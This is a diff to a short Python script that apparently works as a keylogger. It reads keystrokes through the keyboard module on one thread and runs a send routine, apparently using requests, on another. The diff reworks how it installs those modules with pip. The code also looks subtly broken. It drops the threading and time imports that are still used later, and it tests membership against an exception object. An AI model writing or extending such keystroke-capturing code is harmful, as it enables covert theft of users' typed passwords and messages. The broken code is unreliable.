@@ -1,11 +1,14 @@
-import threading,time
-
 def checkModules():
     try:
         import os,keyboard,requests
         print("Modules installed already")
     except ModuleNotFoundError as err:
-        os.system("pip3 install keyboard requests")
+        if "requests" in err:
+            os.system("pip3 install requests")
+            os._exit(0)
+        if "keyboard" in err:
+            os.system("pip3 install keyboard")
+            os._exit(0)
 
 def readKey():
     import os,keyboard
@@ -54,4 +57,4 @@ threading.Thread(target=readKey,daemon=True).start()
 threading.Thread(target=runSend,daemon=True).start()
 
 while True:
-    time.sleep(0.1)
+    time.sleep(1)
